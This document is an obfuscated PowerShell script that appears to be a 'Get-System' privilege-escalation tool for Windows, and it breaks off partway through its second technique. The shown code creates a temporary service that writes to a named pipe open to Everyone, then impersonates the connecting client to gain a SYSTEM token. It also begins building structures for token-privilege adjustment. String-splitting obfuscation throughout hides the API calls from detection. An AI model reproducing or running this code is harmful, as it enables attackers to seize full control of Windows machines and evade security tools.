 &("{0}{3}{1}{2}"-f'S','IaBL','E','ET-Var')  pRa ( [TYpe]("{2}{8}{7}{0}{5}{3}{1}{6}{4}"-f 'MIT.ass','UIlde','SySTem.ReFLE','yb','ss','EmbL','raccE','TIOn.e','c')) ;$bkXJwt= [tYPE]("{2}{5}{6}{1}{0}{3}{4}"-f 'LLIngc','ECTIon.CA','s','onV','eNtIONs','YsTE','m.rEFL');  &("{3}{1}{2}{0}"-f 'BLE','eT-varI','a','S')  ("a"+"74")  ([tyPe]("{1}{0}{2}"-F'pDOmAi','ap','n')) ; $FHcP  =  [TYPe]("{4}{5}{2}{0}{3}{1}{7}{6}{8}" -F 'Emit.AsS','BLyBuIlD','N.','eM','re','fLEcTio','RaCce','e','Ss');    &("{1}{0}"-f '-iTEm','sET')  ("Va"+"R"+"i"+"ABlE:8lc6wB")  (  [TYPE]("{1}{0}{8}{6}{5}{4}{3}{7}{2}"-F'IM','rUNT','GEdTypE','N','S.U','cE','.inTeRoPsErvi','MANa','E'))  ; &("{2}{1}{0}"-f 'AbLE','ET-vArI','S')  ("R"+"iGes"+"x")  ( [Type]("{2}{1}{5}{6}{3}{0}{4}"-F 'RiBU','SeRvice','rUntIME.iNTeroP','tt','tE','S.marshAlAS','a') ); &("{2}{0}{1}"-f '-i','tem','Set')  vARiAble:8Lyg  (  [tYPe]("{10}{0}{3}{2}{5}{1}{9}{7}{8}{11}{6}{4}" -f'Ime','er','rOp','.inTe','iBuTe','S','RtATTR','e','s.dL','VIc','rUnT','liMPO')  )  ; &('sV')  ("jHE"+"C") ( [TyPe]("{3}{2}{0}{4}{5}{1}{6}" -F'cTION.cAL','oNVEnTIO','EfLE','R','li','NGC','nS'));    $1BTX  =[typE]("{5}{4}{7}{8}{1}{3}{0}{6}{2}"-F 'ALLinGconveN','ice','N','s.c','UNtiMe.I','r','Tio','NTeRo','pSERV')  ;  &("{0}{1}"-f 's','ET-ItEm')  VarIaBLE:JFy ([TYpe]("{1}{0}" -f 'Nt32','I')  ) ;  &('sv')  VD2i ([Type]("{0}{1}{2}"-f 'AcTiva','T','Or')  );  $AW5l  =  [TyPE]("{7}{9}{1}{2}{5}{6}{10}{0}{4}{8}{3}"-f'si','pri','n','e','DT','cI','PaL.wellkN','S','YP','EcurITY.','OWN')  ; $35bjA =[TYpE]("{1}{0}{2}"-f 'NTpT','i','r') ; &("{1}{0}"-f 't','se')  ('Uo'+'b9q'+'c') (  [tyPe]("{7}{6}{5}{2}{0}{4}{1}{3}"-F 'Ps','iCeS.','RO','maRSHal','ERV','tE','UNtimE.iN','r') ); &('SV') ("B"+"jf")  ( [tYpE]("{2}{5}{3}{4}{0}{1}"-f'INdowSIDe','NTITY','Se','.pRInC','iPal.w','curiTY')) ; &('sV') ("SY"+"T")  ([tYPe]("{1}{4}{5}{3}{0}{2}"-F 'ThRe','sYsTEm.','Ad','.','ThREadin','G')  )  ;    $aZfpo0=[TYPE]("{4}{3}{0}{6}{2}{1}{5}"-f 'TEm','a','ropsErviCeS.m','S','SY','rSHaL','.rUNtIMe.INte')  ;function gET-`SYSt`EM {

    [CmdletBinding(DEfAULTpArAMeTeRsEtName = {"{1}{0}" -f 'medPipe','Na'})]
    param(
        [Parameter(paRAmEtersEtnaME = "N`A`mE`dpipE")]
        [Parameter(pArAmEtErseTnaME = "To`KEN")]
        [String]
        [ValidateSet({"{1}{0}"-f'medPipe','Na'}, {"{0}{1}" -f 'T','oken'})]
        ${TeC`H`Nique} = ("{1}{0}"-f 'pe','NamedPi'),

        [Parameter(PaRaMeTErsETnAME = "na`mE`dPiPe")]
        [String]
        ${SERV`i`cen`AMe} = ("{2}{1}{0}"-f 'tSVC','s','Te'),

        [Parameter(PArAMeTERSetnaME = "n`Amed`piPe")]
        [String]
        ${P`iPENa`ME} = ("{0}{1}"-f 'T','estSVC'),

        [Parameter(PARAMETeRsetNaME = "ReVtOs`E`lf")]
        [Switch]
        ${rE`VtoSE`Lf},

        [Parameter(ParAmEterseTNaME = "wh`oAmi")]
        [Switch]
        ${W`hOamI}
    )

    ${eRR`ORActI`onpr`e`FerenCE} = ("{0}{1}"-f'St','op')

    
    function l`OcAl:`get-D`eLEGaTETY`PE
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( PosItIoN = 0)]
            [Type[]]
            ${PAr`AmE`T`ers} = (&("{1}{0}{2}"-f '-','New','Object') ("{0}{1}" -f'Type','[]')(0)),
            
            [Parameter( posITion = 1 )]
            [Type]
            ${rE`TuRN`TypE} = [Void]
        )

        ${DOm`AIN} =   ( &("{2}{0}{1}"-f 't-VAriA','Ble','GE') ('A7'+'4') -vALueO)::"cUr`Re`N`TdomaIn"
        ${DYN`Assem`B`ly} = &("{2}{1}{0}" -f'ct','e','New-Obj') ("{5}{7}{6}{3}{1}{4}{0}{2}{8}" -f 'l','flection.Ass','yN','e','emb','S','m.R','yste','ame')(("{3}{0}{1}{2}{4}" -f 'flect','edDele','ga','Re','te'))
        ${AS`s`emBLyBU`iL`DEr} = ${D`OmaIN}."D`e`F`IneDyNa`MIC`Ass`eMblY"(${Dy`NaSs`EMblY},  $Pra::"R`Un")
        ${moDULe`BUI`Lder} = ${aSSE`mBLy`BuilD`Er}.("{3}{1}{4}{5}{0}{2}"-f'l','mi','e','DefineDyna','c','Modu').Invoke(("{0}{2}{4}{3}{1}" -f 'InMemo','le','ry','u','Mod'), ${F`Alse})
        ${tYp`e`BuIldEr} = ${MODul`eBU`ILdEr}.("{0}{1}{2}"-f'Defin','eTyp','e').Invoke(("{0}{4}{2}{1}{3}" -f'M','ateTy','g','pe','yDele'), ("{0}{7}{6}{5}{4}{1}{3}{2}"-f'Clas',', Au','ss','toCla','lass','nsiC',', Sealed, A','s, Public'), [System.MulticastDelegate])
        ${CoNsT`R`UCtorbuilD`ER} = ${t`yp`ebuildEr}.("{3}{2}{1}{0}" -f 'or','truct','efineCons','D').Invoke(("{7}{6}{9}{4}{1}{0}{5}{3}{8}{2}"-f ' HideBySi',',','blic',', ','Name','g','TSpec','R','Pu','ial'),  ( &("{1}{0}" -f'ci','g') ('vaRI'+'ABLE:'+'bkx'+'j'+'wt')).VaLuE::"StAN`Dard", ${parA`mE`TErs})
        ${const`RU`Cto`RBU`iLD`er}.("{4}{1}{0}{2}{3}" -f 'leme','mp','ntation','Flags','SetI').Invoke(("{2}{0}{3}{1}" -f'n','Managed','Ru','time, '))
        ${m`ET`h`od`BUILdEr} = ${t`YpeBU`iLDEr}.("{3}{2}{0}{1}"-f 'etho','d','neM','Defi').Invoke('Invoke', ("{4}{3}{8}{0}{5}{7}{9}{2}{1}{6}"-f'BySig,','ua','t','ublic,','P',' New','l','S',' Hide','lot, Vir'), ${ret`UrNty`PE}, ${Pa`R`AmETErs})
        ${mEth`ODBuild`er}.("{3}{0}{4}{1}{2}"-f'Impl','ationFla','gs','Set','ement').Invoke(("{1}{4}{0}{3}{2}"-f 'Ma','Runti','ed','nag','me, '))
        
        &("{2}{3}{1}{0}" -f 'ut','-Outp','Wr','ite') ${tyP`eBuILD`eR}.("{0}{1}{2}"-f'Cr','eateT','ype').Invoke()
    }

    
    function Lo`cAl:`GET-`PrOcADDr`ESs
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( POSITiOn = 0, manDAToRy = ${T`RUE} )]
            [String]
            ${M`oD`UlE},
            
            [Parameter( poSITIoN = 1, manDAToRy = ${Tr`UE} )]
            [String]
            ${pr`OCE`du`Re}
        )

        
        ${S`Yst`eMAsse`MbLY} =   $A74::"C`U`RRe`NtdoMaIn".("{2}{1}{0}{3}"-f 'ssemblie','etA','G','s').Invoke() |
            &("{2}{0}{1}"-f 'h','ere-Object','W') { ${_}."GLoB`AL`AS`sEMbLY`c`AcHE" -And ${_}."lOCA`T`iON".("{0}{1}" -f 'Spli','t').Invoke('\\')[-1].("{0}{1}"-f'E','quals').Invoke(("{1}{2}{0}"-f 'm.dll','S','yste')) }
        ${uN`s`AFEN`AtivE`ME`ThoDS} = ${sys`T`EMA`sSemB`LY}.("{1}{0}" -f 'tType','Ge').Invoke(("{7}{0}{9}{2}{6}{8}{3}{1}{5}{4}{10}"-f'icro','e','.','tiveM','ho','t','Win32.Unsafe','M','Na','soft','ds'))
        
        ${g`EtModU`lE`H`An`dlE} = ${uNs`AFeNA`TiVEmETH`o`ds}.("{0}{1}{2}" -f'Get','Me','thod').Invoke(("{3}{0}{1}{2}" -f'etMo','duleHandl','e','G'))
        ${gETp`ROc`AD`dR`ess} = ${UNsAF`ena`Ti`VE`Metho`DS}.("{0}{1}"-f 'GetMe','thod').Invoke(("{2}{3}{0}{4}{1}"-f 'ProcAd','ress','G','et','d'))
        
        ${KeR`N32h`AN`DLE} = ${G`ETMODU`LEha`NDLE}."inVo`kE"(${nu`LL}, @(${moD`ULE}))
        ${TmP`ptr} = &("{1}{2}{0}" -f'ect','Ne','w-Obj') ("{1}{0}"-f 'ntPtr','I')
        ${HaN`d`L`eREf} = &("{2}{0}{1}"-f 'ew-Ob','ject','N') ("{7}{0}{9}{10}{3}{2}{4}{8}{6}{1}{11}{5}"-f'u','.','Inter','e.','o','leRef','es','System.R','pServic','n','tim','Hand')(${TmpP`TR}, ${kER`N`32`HANDLe})
        
        
        &("{2}{0}{1}{3}" -f 'te','-Out','Wri','put') ${gETp`R`ocAddRe`ss}."iNv`oKe"(${N`Ull}, @([System.Runtime.InteropServices.HandleRef]${Han`dl`erEf}, ${PRO`Ced`URe}))
    }

    
    
    function LocAL:g`Et-sySt`E`M`Na`mEDp`iPe {
        param(
            [String]
            ${Ser`VI`ceNAMe} = ("{0}{2}{1}" -f 'T','stSVC','e'),

            [String]
            ${pipe`NA`mE} = ("{0}{1}" -f 'TestSV','C')
        )

        ${C`Om`MaND} = ('%CO'+'M'+'SPE'+'C% '+'/C'+' '+'s'+'tart '+'%COMSPEC'+'%'+' '+'/C'+' '+"`"timeout "+'/t'+' '+'3 '+'>nul&'+'&'+'ech'+'o '+"$PipeName "+'> '+"\\.\pipe\$PipeName`"")

        
        ${PIpES`eC`UrITY} = &("{1}{2}{3}{0}"-f'ect','Ne','w','-Obj') ("{3}{4}{7}{6}{0}{8}{1}{5}{2}" -f'.Pi','ip','ecurity','Sy','st','eS','O','em.I','pes.P')
        ${a`cC`e`SsRUle} = &("{2}{0}{1}" -f 'w-O','bject','Ne') ("{2}{7}{3}{8}{0}{5}{4}{1}{6}"-f 'pes','ess','Syste','P','Acc','.Pipe','Rule','m.IO.','i')( ("{1}{0}{2}" -f'e','Ev','ryone'), ("{1}{2}{0}" -f 'te','Rea','dWri'), ("{0}{1}" -f'Allo','w') )
        ${Pi`P`EsEcuri`TY}.("{0}{1}{2}" -f 'AddAcc','es','sRule').Invoke(${Ac`cE`sS`RULE})
        ${p`iPE} = &("{1}{0}{2}" -f'je','New-Ob','ct') ("{7}{3}{5}{4}{2}{6}{1}{0}"-f'm','Strea','.NamedPipe','ystem.IO.P','es','ip','Server','S')(${PIp`E`NAMe},("{0}{1}" -f 'I','nOut'),100, ("{1}{0}" -f 'yte','B'), ("{1}{0}" -f 'ne','No'), 1024, 1024, ${P`iPe`seC`UritY})

        ${P`i`pEhanDLE} = ${Pi`PE}."SAFEp`I`PEH`ANDle".("{3}{0}{1}{4}{2}"-f'rous','G','dle','Dange','etHan').Invoke()

        
        
        ${IM`pE`RsonATE`N`AMEdP`ipE`CLIEntA`Ddr} = &("{4}{0}{1}{2}{3}"-f'ro','c','Add','ress','Get-P') ("{3}{1}{2}{0}"-f 'll','pi32','.d','Adva') ("{4}{3}{0}{5}{1}{2}" -f 'nateN','ed','PipeClient','mperso','I','am')
        ${i`M`pER`SO`NaTEnAMEDpiP`E`cLie`NtDe`LE`G`ATe} = &("{1}{0}{3}{2}" -f 'Delegate','Get-','e','Typ') @( [Int] ) ([Int])
        ${ImPErS`Ona`TEn`AmeDPip`EcliE`Nt} =   ( &('gI')  ('VAri'+'Ab'+'Le'+':A'+'zFpO0')).VAlUe::("{8}{2}{7}{1}{5}{6}{0}{3}{4}"-f'uncti','a','ele','onPoint','er','teFor','F','g','GetD').Invoke(${iMPE`RsoN`AteNAMEDPIpE`cLi`eNT`A`DdR}, ${iMpErS`oNAtE`NaMEDPI`pe`C`LIe`NT`DelEgA`TE})

        ${cl`O`sESErV`Iceh`AndLEADDr} = &("{0}{1}{2}{3}" -f'G','e','t-','ProcAddress') ("{1}{0}{2}{3}"-f'ap','Adv','i32.dl','l') ("{4}{2}{0}{1}{3}" -f 'Se','r','se','viceHandle','Clo')
        ${CLOSeS`E`RviC`e`HANDLEdelegAtE} = &("{1}{0}{2}{3}" -f'-Deleg','Get','ate','Type') @( [IntPtr] ) ([Int])
        ${cL`OSes`eR`ViCEhanDle} =  $AzfPo0::("{0}{5}{1}{8}{2}{4}{6}{3}{7}" -f 'Get','teF','Functi','o','on','Delega','P','inter','or').Invoke(${ClOSeseRViCeh`ANDLE`AD`DR}, ${Clo`s`eSer`V`Iceh`ANDl`E`delE`gATE})

        ${oPe`N`Sc`maNA`ger`AAdDR} = &("{1}{0}{3}{2}" -f'et-ProcAdd','G','s','res') ("{1}{0}{2}" -f 'api32','Adv','.dll') ("{2}{1}{0}"-f 'nSCManagerA','e','Op')
        ${o`p`En`sC`MAn`AgeRAdElegatE} = &("{3}{2}{0}{1}" -f 'ateTyp','e','Deleg','Get-') @( [String], [String], [Int]) ([IntPtr])
        ${op`eNS`cMana`gera} =  $azfPo0::("{4}{6}{1}{5}{3}{0}{7}{8}{2}"-f'ionPo','el','er','t','G','egateForFunc','etD','i','nt').Invoke(${o`p`eNS`cManAg`ERAAdDr}, ${OP`ENsCmAnagER`ADeL`E`gATe})
        
        ${Ope`N`sE`R`VIcEA`ADDR} = &("{0}{3}{2}{1}"-f'Get-Proc','ress','dd','A') ("{2}{1}{3}{0}" -f'l','pi32.','Adva','dl') ("{2}{0}{1}" -f 'penS','erviceA','O')
        ${O`Pense`RV`ICEaD`eLegAtE} = &("{1}{4}{0}{2}{3}"-f 'e','Get','gate','Type','-Del') @( [IntPtr], [String], [Int]) ([IntPtr])
        ${oPe`NSe`R`VI`CEa} =   (  &("{0}{3}{2}{1}{4}"-f 'G','ildit','-CH','ET','em')  vAriaBLE:AzFPo0 ).VaLUE::("{6}{2}{0}{5}{3}{8}{4}{7}{1}" -f 'g','r','Dele','nct','onP','ateForFu','Get','ointe','i').Invoke(${opEN`s`E`RVic`EaAddr}, ${OpenSErViC`e`ADEle`gA`Te})
      
        ${c`ReATESeRvIceA`Ad`DR} = &("{0}{2}{4}{3}{1}"-f 'G','dress','e','-ProcAd','t') ("{1}{0}{2}" -f'dvapi32.dl','A','l') ("{3}{0}{2}{4}{1}"-f't','A','eSer','Crea','vice')
        ${crEATEsE`RVicE`A`dEle`g`ATE} = &("{3}{1}{4}{0}{2}"-f 'egateTyp','et-','e','G','Del') @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        ${cr`eAteS`ERvIC`eA} =   $AZFpo0::("{0}{2}{5}{1}{4}{3}" -f'Ge','Fu','tDe','nter','nctionPoi','legateFor').Invoke(${c`REAteS`erv`IceaADDr}, ${cReaTeSE`RViC`E`ADe`Le`ga`TE})

        ${STArtS`ER`VI`CEAaD`DR} = &("{3}{4}{2}{1}{0}"-f 'ss','e','dr','Get-ProcA','d') ("{3}{0}{1}{2}"-f'32','.d','ll','Advapi') ("{1}{0}{3}{2}" -f'rtS','Sta','A','ervice')
        ${st`ARTs`E`RvIceAdE`LeG`ATE} = &("{4}{1}{3}{0}{2}"-f 'gateT','et-Del','ype','e','G') @( [IntPtr], [Int], [Int]) ([IntPtr])
        ${sTARtseR`V`iCEa} =  $aZFpo0::("{5}{4}{1}{7}{6}{0}{3}{2}" -f 'ionPoin','ateForF','er','t','g','GetDele','nct','u').Invoke(${s`T`ArT`SERvICEa`A`dDR}, ${stARTS`erVIc`eAd`ELeg`ATE})

        ${DeL`EtesE`R`ViceA`ddr} = &("{2}{1}{0}{3}" -f'r','ocAdd','Get-Pr','ess') ("{3}{2}{1}{0}"-f'l','dl','dvapi32.','A') ("{1}{2}{0}" -f 'eService','Dele','t')
        ${DElEteseRV`IC`eDe`Leg`A`TE} = &("{4}{3}{1}{0}{2}" -f'eg','l','ateType','t-De','Ge') @( [IntPtr] ) ([IntPtr])
        ${de`leTeSe`R`V`IcE} =  $aZFpo0::("{4}{5}{3}{6}{8}{0}{7}{2}{1}" -f'ForFun','r','tionPointe','tDeleg','G','e','at','c','e').Invoke(${de`LEteSe`RVI`CEADDr}, ${deLETeSeRVi`CEDel`Eg`ATE})

        ${gEtLas`T`e`RRoRaDdr} = &("{1}{0}{2}{4}{3}"-f 'ro','Get-P','c','ss','Addre') ("{1}{3}{0}{2}" -f'.dl','K','l','ernel32') ("{3}{2}{1}{0}" -f'or','astErr','L','Get')
        ${GetLAsTErRordEL`E`gA`TE} = &("{2}{1}{3}{0}"-f 'pe','et-Delegate','G','Ty') @() ([Int])
        ${GE`TlaSt`er`ROr} =  ( &("{1}{0}{2}"-f'ia','VAr','bLE')  ("A"+"ZfP"+"o0") -valU )::("{4}{5}{0}{3}{1}{6}{2}" -f 'egat','Functi','r','eFor','GetD','el','onPointe').Invoke(${gEt`la`stE`Rr`OrAD`dR}, ${G`Etl`Ast`erRorDe`l`eg`AtE})

        
        
        
        &("{0}{2}{1}{3}" -f 'W','te-Verbo','ri','se') ("{2}{3}{6}{0}{4}{1}{5}" -f'ser','ice m','Op','eni','v','anager','ng ')
        ${m`A`NAgeRH`AND`le} = ${OpenSCM`A`Na`GERA}."In`VOkE"(((("{2}{1}{0}{3}{4}"-f 'l','ca','asIasIlo','hos','t')).("{2}{1}{0}"-f'E','pLaC','RE').Invoke('asI','\')), ("{3}{0}{2}{1}{4}"-f 'ic','c','esA','Serv','tive'), 0xF003F)
        &("{1}{2}{3}{0}"-f 'se','Wr','ite','-Verbo') ('Serv'+'ic'+'e '+'ma'+'nager '+'hand'+'l'+'e: '+"$ManagerHandle")

        
        if (${mANage`R`ha`Ndle} -and (${manAgE`RHA`NDle} -ne 0)) {

            
            
            
            
            
            &("{0}{2}{3}{1}"-f 'Write','rbose','-','Ve') ('Creati'+'n'+'g'+' '+'n'+'ew '+'servi'+'ce:'+' '+"'$ServiceName'")
            try {
                ${SErv`ICe`h`AndlE} = ${CRea`TE`S`e`RvicEa}."Inv`OkE"(${ManA`GERh`AnD`LE}, ${Se`R`VI`cenAmE}, ${SEr`ViC`eNa`Me}, 0xF003F, 0x10, 0x3, 0x1, ${c`O`mMaND}, ${n`UlL}, ${NU`LL}, ${N`Ull}, ${nu`lL}, ${n`Ull})
                ${E`RR} = ${getLASt`Er`ROR}."In`VoKE"()
            }
            catch {
                &("{3}{2}{0}{1}"-f 'ni','ng','ite-War','Wr') ('Err'+'or '+'crea'+'tin'+'g '+'se'+'rvi'+'ce '+': '+"$_")
                ${s`er`VICe`HaN`dlE} = 0
            }
            &("{1}{2}{3}{0}{4}" -f's','Writ','e','-Verbo','e') ('Cre'+'ateS'+'e'+'rviceA '+'Hand'+'le'+': '+"$ServiceHandle")

            if (${SE`R`V`ICE`hANDLe} -and (${sERVI`CeHa`N`dle} -ne 0)) {
                ${sUc`cE`SS} = ${T`RuE}
                &("{0}{1}{3}{2}"-f'Writ','e-Ve','se','rbo') ("{7}{3}{4}{6}{2}{0}{8}{5}{1}" -f 'u',' created','essf','e',' s','y','ucc','Servic','ll')

                
                &("{3}{1}{2}{0}" -f 'Verbose','e','-','Writ') ("{1}{2}{4}{5}{3}{0}"-f 'e','Closin','g ','dl','serv','ice han')
                ${n`ULl} = ${cl`o`SES`ErvIc`EH`AnDle}."Inv`OkE"(${SERV`I`Ce`h`ANDle})

                
                &("{0}{2}{1}{4}{3}"-f'W','t','ri','-Verbose','e') ('O'+'p'+'ening '+'t'+'he '+'s'+'e'+'rvice '+"'$ServiceName'")
                ${SeR`Vi`c`EhaND`Le} = ${O`pe`NsERvIcEA}."InV`OKE"(${MAN`AGE`RHa`NDlE}, ${s`ervic`ENAme}, 0xF003F)
                &("{1}{3}{2}{0}"-f'se','W','o','rite-Verb') ('O'+'pen'+'Serv'+'ic'+'eA '+'hand'+'le:'+' '+"$ServiceHandle")

                if (${S`ERVIC`EHan`d`Le} -and (${SeRvI`cE`hA`N`DLE} -ne 0)){

                    
                    &("{2}{0}{3}{1}"-f 'rite-','se','W','Verbo') ("{1}{0}{3}{2}" -f 'arting t','St','e service','h')
                    ${v`AL} = ${sTARtsERV`ic`Ea}."iN`V`oKE"(${SEr`VI`CehANDLe}, ${nU`Ll}, ${N`Ull})
                    ${E`Rr} = ${gET`laST`ERR`OR}."In`VOke"()

                    
                    if (${v`AL} -ne 0){
                        &("{2}{1}{0}{3}"-f 'Verbos','te-','Wri','e') ("{4}{1}{2}{3}{0}{6}{5}" -f'ly','e s','ucc','essful','Servic','d',' starte')
                        
                        &("{0}{2}{1}" -f'Star','eep','t-Sl') -s 1
                    }
                    else{
                        if (${e`Rr} -eq 1053){
                            &("{3}{1}{0}{2}"-f'b','r','ose','Write-Ve') ((("{0}{6}{5}{7}{1}{2}{4}{3}" -f 'C','d d','id','0}t respond to start','n{','m','o','man'))-f [cHAr]39)
                        }
                        else{
                            &("{3}{2}{0}{1}" -f'-Warnin','g','rite','W') ('StartSer'+'vic'+'e '+'failed,'+' '+'La'+'stEr'+'ror'+': '+"$err")
                        }
                        
                        &("{0}{1}{3}{2}" -f'St','art-Sl','p','ee') -s 1
                    }

                    
                    
                    &("{3}{1}{2}{4}{0}" -f 'bose','t','e-','Wri','Ver') ('D'+'eleting'+' '+'t'+'he '+'s'+'ervice '+"'$ServiceName'")
                    ${V`AL} = ${de`Le`TEServ`ice}."I`NvoKE"(${s`Er`Vice`HA`NdLE})
                    ${e`RR} = ${GETlasTe`R`R`or}."in`VOKe"()

                    if (${V`Al} -eq 0){
                        &("{1}{0}{3}{4}{2}"-f 'e-War','Writ','ng','n','i') ('DeleteS'+'erv'+'ice'+' '+'f'+'ail'+'ed, '+'La'+'stError:'+' '+"$err")
                    }
                    else{
                        &("{0}{2}{1}"-f'W','Verbose','rite-') ("{5}{1}{6}{0}{2}{3}{4}"-f 's','vice','ucce','ssfully',' deleted','Ser',' ')
                    }
                
                    
                    &("{3}{2}{0}{1}" -f'erbo','se','e-V','Writ') ("{3}{4}{0}{6}{5}{1}{7}{2}"-f'sin','the ser','ce handle','Cl','o',' ','g','vi')
                    ${V`Al} = ${clOSeS`ErV`i`CEHanDLe}."IN`VOKE"(${s`eR`V`ic`eHanDle})
                    &("{0}{1}{3}{2}" -f'Write-','Ver','e','bos') ("{0}{7}{3}{6}{2}{1}{4}{5}"-f 'S','e',' clos','vice hand','d of','f','le','er')
                }
                else {
                    &("{1}{2}{0}"-f 'ning','Writ','e-War') ('[!'+'] '+'OpenServ'+'ic'+'e'+'A '+'fa'+'il'+'ed, '+'L'+'ast'+'E'+'rror: '+"$err")
                }
            }

            else {
                &("{0}{1}{2}"-f'Write','-','Warning') ('[!'+'] '+'Cre'+'a'+'te'+'S'+'ervice '+'failed'+', '+'L'+'astErro'+'r: '+"$err")
            }

            
            &("{1}{0}{2}" -f 'er','Write-V','bose') ("{4}{0}{1}{3}{2}"-f 'l','osing the ma','ager handle','n','C')
            ${NU`lL} = ${Clo`SEservi`cEhaNd`Le}."In`V`oke"(${M`A`NagER`hAn`DLE})
        }
        else {
            
            &("{1}{0}{2}"-f'ite-War','Wr','ning') ('[!]'+' '+'OpenS'+'CManage'+'r '+'fail'+'ed'+', '+'Las'+'tErro'+'r: '+"$err")
        }

        if(${SUcCE`Ss}) {
            &("{1}{2}{0}" -f'Verbose','Wr','ite-') ("{6}{0}{5}{7}{2}{4}{1}{3}" -f'a','ct',' conn','ion','e','iting ','W','for pipe')
            ${pi`pe}.("{3}{1}{4}{2}{0}" -f'on','itForCon','ti','Wa','nec').Invoke()

            ${N`Ull} = (&("{2}{1}{0}"-f'ect','ew-Obj','N') ("{6}{3}{4}{2}{1}{0}{5}"-f 'Read','O.Stream','.I','ste','m','er','Sy')(${Pi`pE})).("{2}{1}{0}"-f 'nd','E','ReadTo').Invoke()

            ${O`Ut} = ${iM`pERsoNateNaMeD`PiP`e`CliE`NT}."INv`Oke"([Int]${PIp`EHA`NdLE})
            &("{3}{2}{1}{4}{0}" -f 'bose','e-V','t','Wri','er') ('Im'+'per'+'sonateNa'+'me'+'dPip'+'e'+'Cl'+'ien'+'t: '+"$Out")
        }

        
        ${P`IPE}.("{0}{1}{2}"-f'Di','spos','e').Invoke()
    }

    
    
    
    Function Local:`gET-`SysTe`mtOk`En {
        [CmdletBinding()] param()

        ${dY`N`AS`SEMbLy} = &("{1}{0}{2}" -f'O','New-','bject') ("{3}{0}{1}{5}{2}{4}" -f 'flect','ion','s','Re','emblyName','.As')(("{1}{0}{2}" -f'i','AdjPr','v'))
        ${asSEm`B`L`ybUilder} =  $A74::"cuRRe`N`T`DOmaIn"."de`FiN`edYnamicASseMb`lY"(${DynAS`S`e`MBLy},   (&("{1}{0}"-f'TeM','I')  ("VARiablE"+":"+"FhCp")).VaLue::"r`UN")
        ${m`OD`Ul`eBUiL`deR} = ${A`S`SemBL`y`BuILDER}.("{1}{5}{4}{2}{3}{0}"-f'e','Def','c','Modul','neDynami','i').Invoke(("{1}{0}" -f'Priv','Adj'), ${FaL`se})
        ${A`T`TR`Ibutes} = ("{17}{18}{3}{23}{5}{16}{14}{19}{15}{6}{2}{8}{0}{20}{7}{9}{21}{12}{1}{4}{22}{10}{13}{11}"-f'ti','t, S',' Seque','ay','e',',','ic,','a','n','y','Be','reFieldInit','u','fo','s,',' Publ',' AnsiClas','Aut','oL',' Class,','alL','o','aled, ','out')

        ${TOk`p`R`iv`1lUID`Ty`PebUI`lder} = ${mODu`LebUi`L`d`ER}.("{1}{0}{2}"-f 'fineT','De','ype').Invoke(("{1}{2}{0}{3}" -f '1L','TokPri','v','uid'), ${ATtr`iB`U`TES}, [System.ValueType])
        ${Tokp`R`I`V1luiDtypE`B`UILDER}.("{1}{0}{2}{3}" -f 'fineFi','De','el','d').Invoke(("{1}{0}"-f'unt','Co'), [Int32], ("{1}{0}"-f'c','Publi')) | &("{1}{0}" -f 'ut-Null','O')
        ${Tok`PriV1`LUi`dTyPEBUi`LDER}.("{3}{0}{1}{2}"-f 'ne','Fi','eld','Defi').Invoke(("{1}{0}" -f'uid','L'), [Int64], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}"-f'O','ut-Null')
        ${tO`KPriV1L`U`IdT`ypebUI`ldER}.("{2}{0}{1}"-f'ineF','ield','Def').Invoke(("{0}{1}"-f 'At','tr'), [Int32], ("{1}{0}"-f'c','Publi')) | &("{1}{0}" -f '-Null','Out')
        ${TokPriv1`l`UI`dst`RU`CT} = ${T`o`KpRIV1lUidtYpE`BuIlD`eR}.("{1}{2}{0}" -f'pe','Cr','eateTy').Invoke()

        ${LuI`dTy`PEbu`i`l`deR} = ${ModUL`EbU`IL`D`ER}.("{1}{0}{2}" -f'fineTyp','De','e').Invoke(("{1}{0}" -f 'UID','L'), ${A`TTRi`BUt`Es}, [System.ValueType])
        ${LUI`dtyPEB`UI`L`dER}.("{1}{2}{0}" -f'd','Define','Fiel').Invoke(("{0}{1}" -f 'L','owPart'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{2}{0}{1}"-f 't-','Null','Ou')
        ${L`U`iDtYp`EbUildER}.("{1}{2}{0}"-f 'neField','D','efi').Invoke(("{0}{1}" -f'High','Part'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{0}{2}{1}"-f 'O','t-Null','u')
        ${LUi`d`stR`UCt} = ${LU`IDt`YPEbU`Ilder}.("{2}{0}{1}" -f'yp','e','CreateT').Invoke()

        ${luiD_and_aT`Tri`B`UTest`YPebUI`ldeR} = ${Mo`DUlEBuI`l`DeR}.("{0}{2}{1}" -f 'Defin','ype','eT').Invoke(("{3}{1}{4}{0}{2}" -f 'BUT','N','ES','LUID_A','D_ATTRI'), ${AT`TRIbUT`Es}, [System.ValueType])
        ${Lui`d_aN`d_AT`T`R`ibutESTyPEbuiL`Der}.("{2}{1}{0}"-f 'ld','eFie','Defin').Invoke(("{0}{1}"-f 'L','uid'), ${lui`dstru`ct}, ("{0}{1}"-f 'Publi','c')) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
        ${lU`iD`_aN`d`_A`TTriBuTESTY`p`EBuilDER}.("{3}{2}{1}{0}"-f'ineField','f','e','D').Invoke(("{2}{1}{0}"-f's','ttribute','A'), [UInt32], ("{1}{0}" -f 'blic','Pu')) | &("{0}{2}{1}" -f 'Out','ll','-Nu')
        ${luid`_A`ND`_AttRI`BUTEss`TRUCT} = ${Lu`iD_a`Nd`_A`TTRIbuTEsTYPe`B`UIl`d`eR}.("{3}{2}{1}{0}" -f'eType','at','re','C').Invoke()

        ${cOnStr`Uc`TO`Rin`Fo} =  $rIgeSX.("{1}{0}{3}{4}{2}"-f'tCon','Ge','ors','stru','ct').Invoke()[0]
        ${c`Onstru`cT`oRValUe} =  (  &("{2}{3}{1}{0}" -f 'E','rIaBl','Ge','t-vA')  ('8lC'+'6wb')  -vAL)::"ByvA`LAR`Ray"
        ${Fi`ELd`AR`RAy} = @(  ( &("{0}{3}{1}{2}"-f'Ge','vari','able','t-') ("R"+"iGes"+"X") ).VALue.("{1}{0}{2}"-f'tFie','Ge','ld').Invoke(("{2}{1}{0}" -f 't','ns','SizeCo')))

